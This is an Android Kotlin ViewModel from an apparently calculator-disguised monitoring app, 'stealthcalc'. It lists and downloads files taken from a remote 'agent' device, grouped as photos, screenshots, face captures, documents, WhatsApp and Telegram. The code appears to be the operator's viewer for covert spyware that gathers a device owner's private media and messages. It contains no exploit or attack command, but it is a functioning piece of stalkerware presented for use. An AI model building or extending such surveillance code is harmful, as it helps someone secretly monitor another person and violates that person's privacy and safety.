package com.stealthcalc.monitoring.ui

import android.content.Context
import android.graphics.BitmapFactory
import androidx.compose.ui.graphics.ImageBitmap
import androidx.compose.ui.graphics.asImageBitmap
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.RemoteFile
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import java.io.File
import javax.inject.Inject

enum class GalleryCategory(val label: String, val serverValue: String?) {
    ALL("All", null),
    PHOTOS("Photos", "image"),
    VIDEOS("Videos", "video"),
    SCREENSHOTS("Screenshots", "screenshot"),
    FACES("Face Captures", "face_capture"),
    DOWNLOADS("Downloads", "downloads"),
    DOCUMENTS("Documents", "documents"),
    WHATSAPP("WhatsApp", "whatsapp"),
    TELEGRAM("Telegram", "telegram"),
}

data class GalleryState(
    val isLoading: Boolean = false,
    val files: List<RemoteFile> = emptyList(),
    val selectedCategory: GalleryCategory = GalleryCategory.ALL,
    val viewingFile: RemoteFile? = null,
    val viewingBitmap: ImageBitmap? = null,
    val downloadingFileId: String? = null,
)

@HiltViewModel
class GalleryViewModel @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {

    private val _state = MutableStateFlow(GalleryState())
    val state: StateFlow<GalleryState> = _state.asStateFlow()

    init {
        loadFiles()
    }

    fun selectCategory(category: GalleryCategory) {
        _state.update { it.copy(selectedCategory = category) }
        loadFiles()
    }

    fun loadFiles() {
        viewModelScope.launch {
            _state.update { it.copy(isLoading = true) }
            val deviceId = repository.deviceId
            if (deviceId.isBlank()) {
                _state.update { it.copy(isLoading = false) }
                return@launch
            }
            val category = _state.value.selectedCategory.serverValue
            val files = apiClient.getFiles(deviceId, category)
            _state.update { it.copy(isLoading = false, files = files) }
        }
    }

    fun viewFile(file: RemoteFile) {
        _state.update { it.copy(viewingFile = file, viewingBitmap = null, downloadingFileId = file.fileId) }
        viewModelScope.launch {
            val bytes = apiClient.downloadFileBytes(file.fileId)
            if (bytes != null && file.mimeType.startsWith("image/")) {
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bitmap != null) {
                    _state.update { it.copy(viewingBitmap = bitmap.asImageBitmap(), downloadingFileId = null) }
                    return@launch
                }
            }
            if (bytes != null) {
                val cacheFile = File(context.cacheDir, "gallery_${file.fileId}_${file.fileName}")
                cacheFile.writeBytes(bytes)
                _state.update { it.copy(downloadingFileId = null) }
            } else {
                _state.update { it.copy(downloadingFileId = null) }
            }
        }
    }

    fun closeViewer() {
        _state.update { it.copy(viewingFile = null, viewingBitmap = null) }
    }
}
